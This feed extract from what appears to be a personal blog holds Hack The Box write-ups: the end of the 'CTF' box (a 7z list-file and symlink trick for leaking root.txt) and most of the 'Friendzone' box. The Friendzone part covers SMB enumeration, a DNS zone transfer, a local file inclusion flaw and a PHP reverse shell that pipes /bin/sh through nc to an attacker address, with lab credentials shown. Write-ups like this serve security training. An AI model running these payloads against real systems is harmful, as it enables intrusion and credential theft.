&lt;h4 id=&quot;note-that-we-cant-unzip-the-created-backups-so-even-if-we-created-a-symlink-to-roottxt-in-varwwwhtmluploads-we-wont-be-able-to-read-it-because-the-archive-is-password-protected-the-only-way-to-actually-get-anything-is-through-the-error-log-we-need-to-cause-an-error-that-somehow-leaks-the-flag&quot;&gt;Note that we can’t unzip the created backups, so even if we created a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; we won’t be able to read it because the archive is password protected. The only way to actually get anything is through the error log, we need to cause an error that somehow leaks the flag.&lt;/h4&gt;
&lt;h4 id=&quot;after-searching-for-some-time-i-found-this-page-which-talks-about-a-feature-in-7z-called-list-files-i-thought-if-i-created-2-files-roottxt-and-roottxt-roottxt-is-a-symlink-to-rootroottxt-when-the-command-is-executed-and-gets-to-roottxt-it-will-treat-that-as-a-list-file-option-then-it-will-search-for-roottxt-to-use-it-as-a-list-file-however-that-file-isnt-a-real-list-file-that-may-cause-an-error-also-its-a-symlink-to-rootroottxt&quot;&gt;After searching for some time I found &lt;a href=&quot;https://sevenzip.osdn.jp/chm/cmdline/syntax.htm&quot;&gt;this page&lt;/a&gt; which talks about a feature in &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; called list files. I thought if I created 2 files, &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; is a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;, when the command is executed and gets to &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt; it will treat that as a list file option then it will search for &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; to use it as a list file. However that file isn’t a real list file (that may cause an error), also it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-went-to-varwwwhtmluploads-and-i-didnt-even-have-read-access&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; and I didn’t even have read access.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ cd /var/www/html/uploads/
[ldapuser@ctf uploads]$ ls -al
ls: cannot open directory .: Permission denied
[ldapuser@ctf uploads]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-went-back-to-the-rce-requests-in-burp-and-tried-as-apache&quot;&gt;so I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; requests in burp and tried as &lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-created-a-symlink-to-rootroottxt-as-roottxt-&quot;&gt;I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ln -s /root/root.txt uploads/root.txt&amp;amp;inputOTP=91913130
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-created-an-empty-file-and-called-it-roottxt-&quot;&gt;Then I created an empty file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=touch uploads/@root.txt&amp;amp;inputOTP=91913130
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-check-the-directory-listing-now-&quot;&gt;Let’s check the directory listing now :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ls -la uploads&amp;amp;inputOTP=91913130

total 0
drwxr-x--x. 2 apache apache  39 Jul 20 01:12 .
drwxr-xr-x. 6 root   root   176 Oct 23  2018 ..
-rw-r--r--. 1 apache apache   0 Jul 20 01:12 @root.txt
lrwxrwxrwx. 1 apache apache  14 Jul 20 01:12 root.txt -&amp;gt; /root/root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;everything-is-fine-lets-check-the-error-log-&quot;&gt;Everything is fine let’s check the error log :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---friendzone&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/friendzone/&quot;&gt;Hack The Box - Friendzone&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---lacasadepapel&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lacasadepapel/&quot;&gt;Hack The Box - LaCasaDePapel&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="ssh" /><category term="Python" /><category term="Exploit Development" /><category term="ldap" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an ldap injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is 10.10.10.122, I added it to /etc/hosts as ctf.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ctf.htb Only http on port 80 and ssh on port 22 HTTP Initial Enumeration http://ctf.htb It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it. We need a username and an OTP (one-time password). An OTP is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid OTPs or to be able to generate valid OTPs ourselves. Let’s take a look at the source code of the login page, maybe something is there : ``` &amp;lt;!doctype html&amp;gt;</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/ctf/0.png" /></entry><entry><title type="html">Hack The Box - Friendzone</title><link href="http://localhost:4000/hack-the-box/friendzone/" rel="alternate" type="text/html" title="Hack The Box - Friendzone" /><published>2019-07-13T00:00:00+02:00</published><updated>2019-07-13T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/friendzone</id><content type="html" xml:base="http://localhost:4000/hack-the-box/friendzone/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-friendzone-retired-and-heres-my-write-up-about-it-friendzone-was-a-very-nice-and-easy-box-i-enjoyed-solving-it-and-i-really-liked-it-it-had-a-lot-of-funny-parts-as-well-its-a-linux-box-and-its-ip-is-101010123-i-added-it-to-etchosts-as-friendzonehtb-lets-jump-right-in-&quot;&gt;Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.123&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzone.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT friendzone.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/friendzone/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--i-didnt-do-a-script-scan--sc-because-for-some-reason-it-took-a-lot-of-time-and-didnt-finish&quot;&gt;Note : I didn’t do a script scan (&lt;code class=&quot;highlighter-rouge&quot;&gt;-sC&lt;/code&gt;) because for some reason it took a lot of time and didn’t finish.&lt;/h4&gt;
&lt;h4 id=&quot;we-got-ftp-on-port-21-ssh-on-port-22-dns-on-port-53-http-on-port-80-https-on-port-443-and-smb-unfortunately-anonymous-login-wasnt-allowed-on-ftp-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; on port 53, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;. Unfortunately anonymous login wasn’t allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb 
Connected to friendzone.htb.
220 (vsFTPd 3.0.3)
Name (friendzone.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-check-smb&quot;&gt;Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
&lt;h4 id=&quot;i-used-smbclient-to-list-the-shares-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient --list friendzone.htb -U &quot;&quot;
Enter WORKGROUP\'s password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-also-used-smbmap-to-know-what-permissions-do-i-have--smbmap--h-friendzonehtb--i-found-that-i-had-read-access-to-general-and-readwrite-access-to-development-i-also-noticed-that-the-comment-of-the-share-files-discloses-the-path-of-that-share--etcfiles-so-we-can-assume-that-all-shares-are-in-etc&quot;&gt;I also used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap&lt;/code&gt; to know what permissions do I have : &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H friendzone.htb&lt;/code&gt;.  I found that I had read access to &lt;code class=&quot;highlighter-rouge&quot;&gt;general&lt;/code&gt; and read/write access to &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt;. I also noticed that the comment of the share &lt;code class=&quot;highlighter-rouge&quot;&gt;Files&lt;/code&gt; discloses the path of that share : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Files&lt;/code&gt;, so we can assume that all shares are in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;in-general-i-found-a-file-called-credstxt-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;general&lt;/code&gt; I found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;creds.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/general -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Wed Jan 16 22:10:51 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

                9221460 blocks of size 1024. 6434016 blocks available
smb: \&amp;gt; get creds.txt 
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-we-have-credentials-but-we-dont-know-where-to-use-them-it-says-creds-for-the-admin-thing-so-lets-keep-enumerating-until-we-find-that-admin-thing&quot;&gt;So we have credentials but we don’t know where to use them, it says &lt;code class=&quot;highlighter-rouge&quot;&gt;creds for the admin THING&lt;/code&gt;, so let’s keep enumerating until we find that admin thing.&lt;/h4&gt;
&lt;h4 id=&quot;development-was-just-empty-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; was just empty :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Fri Jul 12 13:17:50 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-since-we-have-write-access-to-that-share-and-we-know-its-path--etcdevelopment-then-that-share-can-help-us-later-if-we-have-a-an-lfi-or-a-similar-vulnerability&quot;&gt;But since we have write access to that share and we know its path : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt; then that share can help us later if we have a an &lt;code class=&quot;highlighter-rouge&quot;&gt;LFI&lt;/code&gt; or a similar vulnerability.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-and-dns&quot;&gt;HTTP and DNS&lt;/h3&gt;
&lt;h4 id=&quot;httpfriendzonehtb-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://friendzone.htb&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;a-static-page-not-really-interesting-i-noticed-that-email-at-the-bottom--infofriendzoneportalred-so-i-added-friendzoneportalred-to-etchosts-&quot;&gt;A static page, not really interesting, I noticed that email at the bottom : &lt;code class=&quot;highlighter-rouge&quot;&gt;info@friendzoneportal.red&lt;/code&gt; so I added &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzoneportal.red&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-httpfriendzoneportalred-was-just-the-same-thing-&quot;&gt;But &lt;code class=&quot;highlighter-rouge&quot;&gt;http://friendzoneportal.red&lt;/code&gt; was just the same thing :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-went-back-and-added-friendzonered-to-the-hosts-file-&quot;&gt;I went back and added &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzone.red&lt;/code&gt; to the hosts file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-it-was-also-the-same-thing-then-i-remembered-that-theres-a-dns-server-so-i-used-dig-&quot;&gt;But it was also the same thing. Then I remembered that there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; server so I used dig :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# dig axfr friendzone.red @10.10.10.123

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.5-P4-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 402 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Fri Jul 12 13:22:51 EET 2019
;; XFR size: 8 records (messages 1, bytes 289)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-have--administrator1friendzonered-hrfriendzonered-and-uploadsfriendzonered-i-edited-the-hosts-file-again-&quot;&gt;now we have : &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator1.friendzone.red&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;hr.friendzone.red&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;uploads.friendzone.red&lt;/code&gt;. I edited the hosts file again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-still-got-the-same-thing-i-ran-gobuster-and-got-wordpress-which-was-empty-&quot;&gt;But I still got the same thing, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got &lt;code class=&quot;highlighter-rouge&quot;&gt;/wordpress&lt;/code&gt; which was empty :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-robotstxt-which-wasnt-a-real-robotstxt-file-d&quot;&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; which wasn’t a real &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file :D&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-was-another-https-port-so-i-tried-that&quot;&gt;There was another &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; port so I tried that.&lt;/h4&gt;
&lt;h4 id=&quot;httpsfriendzonered-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://friendzone.red&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;httpsadministrator1friendzonered-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://administrator1.friendzone.red&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-this-is-the-administrator-thing-lets-try-the-credentials-we-have-&quot;&gt;So this is the “administrator thing” let’s try the credentials we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/friendzone/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-dashboardphp-&quot;&gt;Great. &lt;code class=&quot;highlighter-rouge&quot;&gt;/dashboard.php&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;lfi-in-dashboardphp-user-flag&quot;&gt;LFI in dashboard.php, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;as-you-can-see-its-complaining-about-missing-parameters-by-looking-at-the-example--image_idajpgpagenametimestamp-my-first-guess-was-that-dashboardphp-includes-the-php-file-provided-in-the-pagename-parameter-so-if-we-give-it-test-it-will-append-php-to-test-then-include-that-file-we-can-upload-files-to-the-smb-share-development-and-we-also-know-the-full-path--etcdevelopment-so-if-its-really-vulnerable-to-lfi-we-can-get-a-reverse-shell-easily-i-wrote-a-small-php-script-to-get-a-reverse-shell-&quot;&gt;As you can see it’s complaining about missing parameters, by looking at the example : &lt;code class=&quot;highlighter-rouge&quot;&gt;image_id=a.jpg&amp;amp;pagename=timestamp&lt;/code&gt; my first guess was that &lt;code class=&quot;highlighter-rouge&quot;&gt;dashboard.php&lt;/code&gt; includes the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file provided in the &lt;code class=&quot;highlighter-rouge&quot;&gt;pagename&lt;/code&gt; parameter. So if we give it &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; it will append &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; then include that file. We can upload files to the &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; and we also know the full path : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt;, so if it’s really vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;LFI&lt;/code&gt; we can get a reverse shell easily. I wrote a small &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script to get a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f');
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-uploaded-it-to-development-&quot;&gt;Then I uploaded it to &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; put rev.php 
putting file rev.php as \rev.php (0.3 kb/s) (average 0.3 kb/s)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-finally-i-tested-my-idea-&quot;&gt;And finally I tested my idea :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&amp;amp;pagename=/etc/Development/rev&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/friendzone/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-now-we-have-a-reverse-shell-as-www-data-&quot;&gt;It worked and now we have a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-as-friend-privilege-escalation&quot;&gt;SSH as friend, Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;i-looked-into-varwww-and-found-a-file-called-mysql_dataconf-which-had-some-credentials-&quot;&gt;I looked into &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; and found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_data.conf&lt;/code&gt; which had some credentials :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ls -la
total 36
drwxr-xr-x  8 root root 4096 Oct  6  2018 .
drwxr-xr-x 12 root root 4096 Oct  6  2018 ..
drwxr-xr-x  3 root root 4096 Jan 16 22:13 admin
drwxr-xr-x  4 root root 4096 Oct  6  2018 friendzone
drwxr-xr-x  2 root root 4096 Oct  6  2018 friendzoneportal
drwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmin
drwxr-xr-x  3 root root 4096 Oct  6  2018 html
-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x  3 root root 4096 Oct  6  2018 uploads
$ cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-could-get-ssh-access-as-friend-with-them-&quot;&gt;I could get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; access as friend with them :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# ssh friend@friendzone.htb
The authenticity of host 'friendzone.htb (10.10.10.123)' can't be established.
